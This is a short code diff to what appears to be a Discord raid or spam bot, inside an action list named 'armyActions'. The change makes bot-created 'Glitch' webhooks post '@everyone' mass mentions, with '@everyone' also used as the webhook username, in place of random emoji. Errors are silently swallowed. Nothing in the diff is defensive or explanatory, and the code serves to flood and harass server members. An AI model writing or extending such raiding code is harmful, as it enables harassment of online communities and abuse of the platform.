@@ -333,8 +333,10 @@ const armyActions = [
         const webhook = await getOrCreateWebhook(channel, 'Glitch');
         if (!webhook) return;
         await webhook.send({
-          content: randomItem(['👁', '💀', '🔥', '⚠️', '☠️', '💥', '🌀', '❌', '🩸']),
-          username: randomItem(['Glitch', 'Null', 'Error', 'Void', 'Rage']),
+          content: randomItem([ `@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,
+  `@everyone`,]),
+          username: randomItem([ `@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,
+  `@everyone`,]),
         }).catch(() => {});
       })());
     }
